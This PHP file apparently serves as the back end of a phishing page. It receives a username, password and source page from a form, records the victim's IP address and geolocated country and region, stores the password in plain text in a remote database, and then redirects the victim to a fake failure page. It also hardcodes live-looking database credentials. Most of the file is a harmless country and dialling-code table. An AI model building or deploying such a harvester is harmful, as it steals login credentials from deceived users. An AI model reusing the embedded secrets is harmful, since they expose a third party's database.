<?php
// Enable error reporting
ini_set('display_errors', 1);
ini_set('display_startup_errors', 1);
error_reporting(E_ALL);

// Check if the form data is properly sent
if (!isset($_POST['username']) || !isset($_POST['password']) || !isset($_POST['source_page'])) {
    die("Error: All fields are required.");
}

// Get form data
$username = $_POST['username'];
$password = $_POST['password']; // Store password as plain text (not recommended)
$source_page = $_POST['source_page'];

// Get user's IP address
$ip_address = $_SERVER['REMOTE_ADDR'];

// Use ipinfo.io to get location details
$ipinfo_json = file_get_contents("http://ipinfo.io/{$ip_address}/json");
if ($ipinfo_json === FALSE) {
    die("Error fetching IP info");
}

$ipinfo = json_decode($ipinfo_json, true);
if (json_last_error() !== JSON_ERROR_NONE) {
    die("Error decoding JSON: " . json_last_error_msg());
}

$country_code = $ipinfo['country'] ?? 'Unknown';
$state_name = $ipinfo['region'] ?? 'Unknown';

// Map of country codes to full country names and their corresponding phone number codes
$country_names = [
      'AF' => ['name' => 'Afghanistan', 'code' => '+93'],
    'AL' => ['name' => 'Albania', 'code' => '+355'],
    'DZ' => ['name' => 'Algeria', 'code' => '+213'],
    'AD' => ['name' => 'Andorra', 'code' => '+376'],
    'AO' => ['name' => 'Angola', 'code' => '+244'],
    'AG' => ['name' => 'Antigua and Barbuda', 'code' => '+1-268'],
    'AR' => ['name' => 'Argentina', 'code' => '+54'],
    'AM' => ['name' => 'Armenia', 'code' => '+374'],
    'AU' => ['name' => 'Australia', 'code' => '+61'],
    'AT' => ['name' => 'Austria', 'code' => '+43'],
    'AZ' => ['name' => 'Azerbaijan', 'code' => '+994'],
    'BS' => ['name' => 'Bahamas', 'code' => '+1-242'],
    'BH' => ['name' => 'Bahrain', 'code' => '+973'],
    'BD' => ['name' => 'Bangladesh', 'code' => '+880'],
    'BB' => ['name' => 'Barbados', 'code' => '+1-246'],
    'BY' => ['name' => 'Belarus', 'code' => '+375'],
    'BE' => ['name' => 'Belgium', 'code' => '+32'],
    'BZ' => ['name' => 'Belize', 'code' => '+501'],
    'BJ' => ['name' => 'Benin', 'code' => '+229'],
    'BT' => ['name' => 'Bhutan', 'code' => '+975'],
    'BO' => ['name' => 'Bolivia', 'code' => '+591'],
    'BA' => ['name' => 'Bosnia and Herzegovina', 'code' => '+387'],
    'BW' => ['name' => 'Botswana', 'code' => '+267'],
    'BR' => ['name' => 'Brazil', 'code' => '+55'],
    'BN' => ['name' => 'Brunei', 'code' => '+673'],
    'BG' => ['name' => 'Bulgaria', 'code' => '+359'],
    'BF' => ['name' => 'Burkina Faso', 'code' => '+226'],
    'BI' => ['name' => 'Burundi', 'code' => '+257'],
    'CV' => ['name' => 'Cabo Verde', 'code' => '+238'],
    'KH' => ['name' => 'Cambodia', 'code' => '+855'],
    'CM' => ['name' => 'Cameroon', 'code' => '+237'],
    'CA' => ['name' => 'Canada', 'code' => '+1'],
    'CF' => ['name' => 'Central African Republic', 'code' => '+236'],
    'TD' => ['name' => 'Chad', 'code' => '+235'],
    'CL' => ['name' => 'Chile', 'code' => '+56'],
    'CN' => ['name' => 'China', 'code' => '+86'],
    'CO' => ['name' => 'Colombia', 'code' => '+57'],
    'KM' => ['name' => 'Comoros', 'code' => '+269'],
    'CD' => ['name' => 'Congo, Democratic Republic of the', 'code' => '+243'],
    'CG' => ['name' => 'Congo, Republic of the', 'code' => '+242'],
    'CR' => ['name' => 'Costa Rica', 'code' => '+506'],
    'HR' => ['name' => 'Croatia', 'code' => '+385'],
    'CU' => ['name' => 'Cuba', 'code' => '+53'],
    'CY' => ['name' => 'Cyprus', 'code' => '+357'],
    'CZ' => ['name' => 'Czech Republic', 'code' => '+420'],
    'DK' => ['name' => 'Denmark', 'code' => '+45'],
    'DJ' => ['name' => 'Djibouti', 'code' => '+253'],
    'DM' => ['name' => 'Dominica', 'code' => '+1-767'],
    'DO' => ['name' => 'Dominican Republic', 'code' => '+1-809', 'alt_code' => '+1-829', 'alt_code_2' => '+1-849'],
    'TL' => ['name' => 'East Timor', 'code' => '+670'],
    'EC' => ['name' => 'Ecuador', 'code' => '+593'],
    'EG' => ['name' => 'Egypt', 'code' => '+20'],
    'SV' => ['name' => 'El Salvador', 'code' => '+503'],
    'GQ' => ['name' => 'Equatorial Guinea', 'code' => '+240'],
    'ER' => ['name' => 'Eritrea', 'code' => '+291'],
    'EE' => ['name' => 'Estonia', 'code' => '+372'],
    'SZ' => ['name' => 'Eswatini', 'code' => '+268'],
    'ET' => ['name' => 'Ethiopia', 'code' => '+251'],
    'FJ' => ['name' => 'Fiji', 'code' => '+679'],
    'FI' => ['name' => 'Finland', 'code' => '+358'],
    'FR' => ['name' => 'France', 'code' => '+33'],
    'GA' => ['name' => 'Gabon', 'code' => '+241'],
    'GM' => ['name' => 'Gambia', 'code' => '+220'],
    'GE' => ['name' => 'Georgia', 'code' => '+995'],
    'DE' => ['name' => 'Germany', 'code' => '+49'],
    'GH' => ['name' => 'Ghana', 'code' => '+233'],
    'GR' => ['name' => 'Greece', 'code' => '+30'],
    'GD' => ['name' => 'Grenada', 'code' => '+1-473'],
    'GT' => ['name' => 'Guatemala', 'code' => '+502'],
    'GN' => ['name' => 'Guinea', 'code' => '+224'],
    'GW' => ['name' => 'Guinea-Bissau', 'code' => '+245'],
    'GY' => ['name' => 'Guyana', 'code' => '+592'],
    'HT' => ['name' => 'Haiti', 'code' => '+509'],
    'HN' => ['name' => 'Honduras', 'code' => '+504'],
    'HU' => ['name' => 'Hungary', 'code' => '+36'],
    'IS' => ['name' => 'Iceland', 'code' => '+354'],
    'IN' => ['name' => 'India', 'code' => '+91'],
    'ID' => ['name' => 'Indonesia', 'code' => '+62'],
    'IR' => ['name' => 'Iran', 'code' => '+98'],
    'IQ' => ['name' => 'Iraq', 'code' => '+964'],
    'IE' => ['name' => 'Ireland', 'code' => '+353'],
    'IL' => ['name' => 'Israel', 'code' => '+972'],
    'IT' => ['name' => 'Italy', 'code' => '+39'],
    'CI' => ['name' => 'Ivory Coast', 'code' => '+225'],
    'JM' => ['name' => 'Jamaica', 'code' => '+1-876'],
    'JP' => ['name' => 'Japan', 'code' => '+81'],
    'JO' => ['name' => 'Jordan', 'code' => '+962'],
    'KZ' => ['name' => 'Kazakhstan', 'code' => '+7'],
    'KE' => ['name' => 'Kenya', 'code' => '+254'],
    'KI' => ['name' => 'Kiribati', 'code' => '+686'],
    'KP' => ['name' => 'Korea, North', 'code' => '+850'],
    'KR' => ['name' => 'Korea, South', 'code' => '+82'],
    'KW' => ['name' => 'Kuwait', 'code' => '+965'],
    'KG' => ['name' => 'Kyrgyzstan', 'code' => '+996'],
    'LA' => ['name' => 'Laos', 'code' => '+856'],
    'LV' => ['name' => 'Latvia', 'code' => '+371'],
    'LB' => ['name' => 'Lebanon', 'code' => '+961'],
    'LS' => ['name' => 'Lesotho', 'code' => '+266'],
    'LR' => ['name' => 'Liberia', 'code' => '+231'],
    'LY' => ['name' => 'Libya', 'code' => '+218'],
    'LI' => ['name' => 'Liechtenstein', 'code' => '+423'],
    'LT' => ['name' => 'Lithuania', 'code' => '+370'],
    'LU' => ['name' => 'Luxembourg', 'code' => '+352'],
    'MG' => ['name' => 'Madagascar', 'code' => '+261'],
    'MW' => ['name' => 'Malawi', 'code' => '+265'],
    'MY' => ['name' => 'Malaysia', 'code' => '+60'],
    'MV' => ['name' => 'Maldives', 'code' => '+960'],
    'ML' => ['name' => 'Mali', 'code' => '+223'],
    'MT' => ['name' => 'Malta', 'code' => '+356'],
    'MH' => ['name' => 'Marshall Islands', 'code' => '+692'],
    'MR' => ['name' => 'Mauritania', 'code' => '+222'],
    'MU' => ['name' => 'Mauritius', 'code' => '+230'],
    'MX' => ['name' => 'Mexico', 'code' => '+52'],
    'FM' => ['name' => 'Micronesia', 'code' => '+691'],
    'MD' => ['name' => 'Moldova', 'code' => '+373'],
    'MC' => ['name' => 'Monaco', 'code' => '+377'],
    'MN' => ['name' => 'Mongolia', 'code' => '+976'],
    'ME' => ['name' => 'Montenegro', 'code' => '+382'],
    'MA' => ['name' => 'Morocco', 'code' => '+212'],
    'MZ' => ['name' => 'Mozambique', 'code' => '+258'],
    'MM' => ['name' => 'Myanmar', 'code' => '+95'],
    'NA' => ['name' => 'Namibia', 'code' => '+264'],
    'NR' => ['name' => 'Nauru', 'code' => '+674'],
    'NP' => ['name' => 'Nepal', 'code' => '+977'],
    'NL' => ['name' => 'Netherlands', 'code' => '+31'],
    'NZ' => ['name' => 'New Zealand', 'code' => '+64'],
    'NI' => ['name' => 'Nicaragua', 'code' => '+505'],
    'NE' => ['name' => 'Niger', 'code' => '+227'],
    'NG' => ['name' => 'Nigeria', 'code' => '+234'],
    'MK' => ['name' => 'North Macedonia', 'code' => '+389'],
    'NO' => ['name' => 'Norway', 'code' => '+47'],
    'OM' => ['name' => 'Oman', 'code' => '+968'],
    'PK' => ['name' => 'Pakistan', 'code' => '+92'],
    'PW' => ['name' => 'Palau', 'code' => '+680'],
    'PA' => ['name' => 'Panama', 'code' => '+507'],
    'PG' => ['name' => 'Papua New Guinea', 'code' => '+675'],
    'PY' => ['name' => 'Paraguay', 'code' => '+595'],
    'PE' => ['name' => 'Peru', 'code' => '+51'],
    'PH' => ['name' => 'Philippines', 'code' => '+63'],
    'PL' => ['name' => 'Poland', 'code' => '+48'],
    'PT' => ['name' => 'Portugal', 'code' => '+351'],
    'QA' => ['name' => 'Qatar', 'code' => '+974'],
    'RO' => ['name' => 'Romania', 'code' => '+40'],
    'RU' => ['name' => 'Russia', 'code' => '+7'],
    'RW' => ['name' => 'Rwanda', 'code' => '+250'],
    'KN' => ['name' => 'Saint Kitts and Nevis', 'code' => '+1-869'],
    'LC' => ['name' => 'Saint Lucia', 'code' => '+1-758'],
    'VC' => ['name' => 'Saint Vincent and the Grenadines', 'code' => '+1-784'],
    'WS' => ['name' => 'Samoa', 'code' => '+685'],
    'SM' => ['name' => 'San Marino', 'code' => '+378'],
    'ST' => ['name' => 'Sao Tome and Principe', 'code' => '+239'],
    'SA' => ['name' => 'Saudi Arabia', 'code' => '+966'],
    'SN' => ['name' => 'Senegal', 'code' => '+221'],
    'RS' => ['name' => 'Serbia', 'code' => '+381'],
    'SC' => ['name' => 'Seychelles', 'code' => '+248'],
    'SL' => ['name' => 'Sierra Leone', 'code' => '+232'],
    'SG' => ['name' => 'Singapore', 'code' => '+65'],
    'SK' => ['name' => 'Slovakia', 'code' => '+421'],
    'SI' => ['name' => 'Slovenia', 'code' => '+386'],
    'SB' => ['name' => 'Solomon Islands', 'code' => '+677'],
    'SO' => ['name' => 'Somalia', 'code' => '+252'],
    'ZA' => ['name' => 'South Africa', 'code' => '+27'],
    'SS' => ['name' => 'South Sudan', 'code' => '+211'],
    'ES' => ['name' => 'Spain', 'code' => '+34'],
    'LK' => ['name' => 'Sri Lanka', 'code' => '+94'],
    'SD' => ['name' => 'Sudan', 'code' => '+249'],
    'SR' => ['name' => 'Suriname', 'code' => '+597'],
    'SE' => ['name' => 'Sweden', 'code' => '+46'],
    'CH' => ['name' => 'Switzerland', 'code' => '+41'],
    'SY' => ['name' => 'Syria', 'code' => '+963'],
    'TW' => ['name' => 'Taiwan', 'code' => '+886'],
    'TJ' => ['name' => 'Tajikistan', 'code' => '+992'],
    'TZ' => ['name' => 'Tanzania', 'code' => '+255'],
    'TH' => ['name' => 'Thailand', 'code' => '+66'],
    'TG' => ['name' => 'Togo', 'code' => '+228'],
    'TO' => ['name' => 'Tonga', 'code' => '+676'],
    'TT' => ['name' => 'Trinidad and Tobago', 'code' => '+1-868'],
    'TN' => ['name' => 'Tunisia', 'code' => '+216'],
    'TR' => ['name' => 'Turkey', 'code' => '+90'],
    'TM' => ['name' => 'Turkmenistan', 'code' => '+993'],
    'TV' => ['name' => 'Tuvalu', 'code' => '+688'],
    'UG' => ['name' => 'Uganda', 'code' => '+256'],
    'UA' => ['name' => 'Ukraine', 'code' => '+380'],
    'AE' => ['name' => 'United Arab Emirates', 'code' => '+971'],
    'GB' => ['name' => 'United Kingdom', 'code' => '+44'],
    'US' => ['name' => 'United States', 'code' => '+1'],
    'UY' => ['name' => 'Uruguay', 'code' => '+598'],
    'UZ' => ['name' => 'Uzbekistan', 'code' => '+998'],
    'VU' => ['name' => 'Vanuatu', 'code' => '+678'],
    'VA' => ['name' => 'Vatican City', 'code' => '+39-06'],
    'VE' => ['name' => 'Venezuela', 'code' => '+58'],
    'VN' => ['name' => 'Vietnam', 'code' => '+84'],
    'YE' => ['name' => 'Yemen', 'code' => '+967'],
    'ZM' => ['name' => 'Zambia', 'code' => '+260'],
    'ZW' => ['name' => 'Zimbabwe', 'code' => '+263'],
];

$country_name = $country_names[$country_code]['name'] ?? $country_code;
$phone_code = $country_names[$country_code]['code'] ?? 'Unknown';

// Database connection details
$servername = "sql304.infinityfree.com";
$username_db = "if0_36948794";
$password_db = "nrPgMPUVzI";
$dbname = "if0_36948794_Data";

// Create connection
$conn = new mysqli($servername, $username_db, $password_db, $dbname);

// Check connection
if ($conn->connect_error) {
    die("Connection failed: " . $conn->connect_error);
}

// Prepare and bind
$stmt = $conn->prepare("INSERT INTO user_details (source_page, username, password, ip_address, country_name, state_name, phone_code) VALUES (?, ?, ?, ?, ?, ?, ?)");
if ($stmt === FALSE) {
    die("Prepare failed: " . $conn->error);
}

if ($stmt->bind_param("sssssss", $source_page, $username, $password, $ip_address, $country_name, $state_name, $phone_code) === FALSE) {
    die("Bind failed: " . $stmt->error);
}

// Execute the statement
if ($stmt->execute() === FALSE) {
    die("Execute failed: " . $stmt->error);
} else {
    header("Location: gofailed.html");
    exit();
}

// Close the statement and connection
$stmt->close();
$conn->close();
?>
